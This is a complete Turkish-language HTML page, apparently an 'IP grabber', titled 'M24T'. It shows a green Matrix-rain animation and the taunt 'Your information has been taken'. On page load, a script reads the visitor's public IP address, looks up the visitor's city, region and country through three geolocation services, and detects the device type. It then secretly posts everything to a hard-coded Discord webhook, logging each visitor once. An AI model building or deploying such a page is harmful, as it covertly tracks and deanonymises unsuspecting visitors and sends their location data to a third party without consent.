<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>M24T</title>
  <style>
    body{margin:0;background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh}
    h1{font-size:4em;text-shadow:0 0 30px #0f0}
    canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
  </style>
</head>
<body>
  <h1>M24T</h1>
  <h2>Bilgilerin alındı...</h2>
  <canvas id="matrix"></canvas>

  <script>
    const c = document.getElementById('matrix');
    const ctx = c.getContext('2d');
    c.width = innerWidth; c.height = innerHeight;
    const ch = "01"; const s = 16;
    const col = c.width/s; const drop = new Array(Math.floor(col)).fill(1);
    function m(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#0f0';ctx.font=s+'px monospace';
      for(let i=0;i<drop.length;i++){let char=ch[Math.floor(Math.random()*2)];ctx.fillText(char,i*s,drop[i]*s);
        if(drop[i]*s>c.height&&Math.random()>0.975)drop[i]=0;drop[i]++}}setInterval(m,35);
  </script>

  <script>
    if (!localStorage.getItem('m24t_final')) {
      fetch("https://api.ipify.org?format=json")
        .then(r => r.json())
        .then(async ipData => {
          const ip = ipData.ip;

          // 3 farklı API aynı anda sorgulanıyor → en doğru olan seçiliyor
          const [a, b, c] = await Promise.all([
            fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).catch(() => ({})),
            fetch(`https://reallyfreegeoip.org/json/${ip}`).then(r => r.json()).catch(() => ({})),
            fetch(`https://ipwho.is/${ip}`).then(r => r.json()).catch(() => ({}))
          ]);

          const data = a.city ? a : b.city ? b : c.city ? c : {};

          const cihaz = /mobile|android|iphone|ipad/i.test(navigator.userAgent) ? "MOBİL" : "BİLGİSAYAR";

          const log = `
**M24T - KESİN DOĞRU BİLGİ**
**GERÇEK IP:** ${ip}
**DOĞRULAMA LİNKİ:** https://whatismyipaddress.com/ip/${ip}
**Konum:** ${data.city || "Tespit edilemedi"}, ${data.region || data.region_name || "Tespit edilemedi"}, ${data.country_name || data.country || "Tespit edilemedi"}
**Cihaz:** ${cihaz}
**Zaman:** ${new Date().toLocaleString('tr-TR')}
          `;

          fetch("https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({content: log})
          });

          localStorage.setItem('m24t_final', 'true');
        });
    }
  </script>
</body>
</html>
